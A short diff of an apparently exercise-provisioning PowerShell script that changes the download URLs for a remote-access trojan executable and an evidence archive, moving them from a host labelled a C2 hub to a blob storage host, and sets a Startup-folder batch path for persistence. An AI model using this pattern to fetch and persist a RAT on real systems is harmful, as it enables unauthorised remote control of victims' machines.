@@ -17,9 +17,9 @@ param(
 
 # Static URLs to download RAT and static download locat
 # CAUTION - C2 HUB MOST BE ONLINE AS THIS IS A STATIC DOWNLOAD OPERATION! <to be adjusted in future updates>
-$raturl = "http://north2.hub.envar.io/vault76kg/drvfrw.exe"
+$raturl = "https://hustonftlauderdale.blob.core.windows.net/huston/drvfrw.exe"
 # For C51 additional evidence file was provided by CC - downloading to D:\
-$evidenceurl = "http://north2.hub.envar.io/vault76kg/20210429C51EVIDENCE.zip"
+$evidenceurl = "https://hustonftlauderdale.blob.core.windows.net/huston/20210429C51EVIDENCE.zip"
 $evidence = "D:\evidence.zip"
 $evidenceoutput = "D:\EvidenceFiles"
 $startup = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\runadm.bat"
